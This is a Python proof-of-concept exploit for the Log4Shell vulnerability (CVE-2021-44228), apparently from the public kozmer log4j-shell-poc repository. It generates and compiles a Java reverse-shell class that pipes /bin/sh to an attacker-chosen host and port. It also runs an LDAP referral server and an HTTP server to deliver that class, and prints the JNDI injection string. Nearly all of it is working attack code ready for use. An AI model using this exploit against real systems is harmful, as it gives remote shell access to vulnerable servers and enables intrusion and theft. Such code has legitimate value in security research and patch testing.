#!/usr/bin/env python3

import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()

def generate_payload(userip: str, lport: int) -> None:
    program = f"""
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {{

    public Exploit() throws Exception {{
        String host="{userip}";
        int port={lport};
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {{
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {{
                p.exitValue();
                break;
            }}
            catch (Exception e){{
            }}
        }};
        p.destroy();
        s.close();
    }}
}}
"""
    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "/usr/bin/javac"), str(p)])
    except OSError as e:
        print(f'[-] Error: {e}')
        raise e
    else:
        print('[+] Exploit Java class created successfully')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print('[+] Setting up LDAP server...')

    # create the LDAP server on a new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Web server on port {webport} at http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, '/usr/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(f"[+] LDAP payload ready to receive: {sendme}\n")

    url = f"http://{userip}:{lport}/#Exploit"
    subprocess.run([
        os.path.join(CUR_FOLDER, "/usr/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    print("""
[!] CVE: CVE-2021-44228
""")
    userip = input('Enter the target IP for LDAPRefServer & Shell (default: localhost): ')
    webport = int(input('Enter the listener port for HTTP server (default: 8000): '))
    lport = int(input('Enter the Netcat port (default: 9001): '))

    if not userip:
        userip = 'localhost'
    if not webport:
        webport = 8000
    if not lport:
        lport = 9001

    try:
        if not check_java():
            print('[-] Java is not installed inside the repository')
            raise SystemExit(1)
        payload(userip, webport, lport)
    except KeyboardInterrupt:
        print("[-] User interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
# GitHub repo: https://github.com/kozmer/log4j-shell-poc
